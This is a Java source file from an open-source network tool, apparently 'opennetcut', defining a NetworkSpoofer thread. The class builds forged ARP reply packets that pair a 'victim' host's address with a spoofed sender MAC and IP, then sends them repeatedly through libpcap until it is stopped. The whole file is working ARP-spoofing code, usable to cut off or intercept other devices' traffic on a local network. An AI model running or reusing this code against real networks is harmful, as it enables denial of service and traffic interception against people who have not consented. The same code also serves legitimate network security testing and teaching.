/**
 * Copyright (C) 2017  Ardika Rommy Sanjaya
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package com.ardikars.opennetcut.app;

import com.ardikars.jxnet.*;
import static com.ardikars.jxnet.Jxnet.PcapSendPacket;
import com.ardikars.jxnet.util.FormatUtils;
import com.ardikars.jxnet.packet.ethernet.Ethernet;
import com.ardikars.jxnet.packet.arp.ARPOperationCode;

import java.nio.ByteBuffer;
import java.util.logging.Level;
import java.util.logging.Logger;

@SuppressWarnings("unchecked")
public class NetworkSpoofer extends Thread {
    
    private volatile boolean stop = false;
    
    private MacAddress spoofedMacAddr;
    private final Inet4Address spoofedIpAddr;
    private final MacAddress victimMacAddr;
    private final Inet4Address victimIpAddr;
    
    private final long to_ms;

    public NetworkSpoofer(MacAddress victimMacAddr, Inet4Address victimIpAddr,
            MacAddress spoofedMacAddr, Inet4Address spoofedIpAddr, long to_ms) {
        this.spoofedIpAddr = spoofedIpAddr;
        this.spoofedMacAddr = spoofedMacAddr;
        this.victimIpAddr = victimIpAddr;
        this.victimMacAddr = victimMacAddr;
        this.to_ms = to_ms;
    }

    @Override
    public void run() {
        Ethernet ethernet = (Ethernet) PacketBuilder.arpBuilder(victimMacAddr, ARPOperationCode.ARP_REPLY,
                spoofedMacAddr, spoofedIpAddr, victimMacAddr, victimIpAddr);
        /*Ethernet ethernet = new Ethernet()
                .setDestinationMacAddress(victimMacAddr)
                .setSourceMacAddress(StaticField.CURRENT_MAC_ADDRESS)
                .setEtherType(EtherType.ARP)
                .setPadding(true);
        ARP arp = new ARP()
                .setHardwareType(DatalinkType.EN10MB)
                .setProtocolType(EtherType.IPV4)
                .setHardwareAddressLength((byte) 0x06)
                .setProtocolAddressLength((byte) 0x04)
                .setOpCode(ARPOperationCode.ARP_REPLY)
                .setSenderHardwareAddress(spoofedMacAddr) //spoofed
                .setSenderProtocolAddress(spoofedIpAddr) //spoofed
                .setTargetHardwareAddress(victimMacAddr)
                .setTargetProtocolAddress(victimIpAddr);
        ethernet.setPacket(arp); */
        while (!stop) {
            try {
                sleep(to_ms);
            } catch (InterruptedException ex) {
                Logger.getLogger(NetworkSpoofer.class.getName()).log(Level.SEVERE, null, ex);
            }
            ByteBuffer buffer = FormatUtils.toDirectBuffer(ethernet.toBytes());
            if (PcapSendPacket(StaticField.PCAP, buffer, buffer.capacity()) != 0) {
                if (StaticField.LOGGER != null) {
                    StaticField.LOGGER.log(LoggerStatus.COMMON, "[ WARNING ] :: Failed to send arp packet.");
                }
                stop = true;
            }
        }
    }
    
    public void stopThread() {
        this.stop = true;
    }
    
}
